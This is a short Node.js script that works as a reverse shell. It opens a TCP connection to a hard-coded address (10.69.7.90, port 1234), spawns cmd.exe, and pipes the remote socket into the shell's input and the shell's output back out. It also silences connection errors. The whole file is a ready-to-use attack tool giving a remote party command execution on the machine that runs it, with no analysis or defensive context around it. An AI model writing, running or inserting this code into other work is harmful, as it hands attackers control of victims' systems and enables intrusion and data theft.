const net = require('net');
const { spawn } = require('child_process');

// Configuration
const HOST = '10.69.7.90';
const PORT = 1234;

const client = new net.Socket();

client.connect(PORT, HOST, () => {
    // Spawn the shell process
    // Use 'cmd.exe' for Windows or '/bin/sh' for Linux/Unix
    const shell = spawn('cmd.exe', [], { shell: true });

    // Pipe the network input into the shell's input
    client.pipe(shell.stdin);

    // Pipe the shell's output and error back to the network
    shell.stdout.pipe(client);
    shell.stderr.pipe(client);

    // Handle connection closure
    shell.on('exit', () => client.destroy());
    client.on('error', () => {}); // Prevent crash on connection drop
});